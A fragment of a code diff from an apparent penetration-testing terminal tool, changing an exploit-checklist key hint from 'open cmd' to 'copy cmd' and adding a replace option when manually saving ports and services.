+              f"{DIM}— <n> done · s <n> skip · c <n><a-z> copy cmd · s · f · b{RESET}")
         return "stay"
 
     _run_view(f"{ip}:{port}/{proto} exploit",
-              "[Enter] refresh · <n> done · s <n> skip · r <n><a-z> open cmd · "
+              "[Enter] refresh · <n> done · s <n> skip · c <n><a-z> copy cmd · "
               "[s] status · [f] findings · [b] back · [m] menu",
               lambda: _render_exploit_checklist(ip, target), _handle)
 
@@ -7051,7 +5971,7 @@ def _manual_add_port(ip: str) -> None:
     row = {"port": port, "proto": proto, "state": state}
     if name:
         row["service"] = {"name": name}
-    save_ports(ip, [row], source="manual")
+    save_ports(ip, [row], source="manual", replace=True)
     print(f"{GREEN}✓ added {port}/{proto} ({state}) on {ip}{RESET}")
 
 
@@ -7068,7 +5988,7 @@ def _manual_add_service(ip: str) -> None:
         return
     save_ports(ip, [{"port": port, "proto": proto, "state": "open"}], source="manual")
     save_services(ip, [{"port": port, "proto": proto, "name": name,
-                        "product": product, "version": version}], source="manual")
+                        "product": product, "version": version}], source="manual", replace=True)
     print(f"{GREEN}✓ set service {name or ''} {product or ''} {version or ''} on "
           f"{port}/{proto}{RESET}{DIM} — run vuln-scan / exploit to use it{RESET}")
 
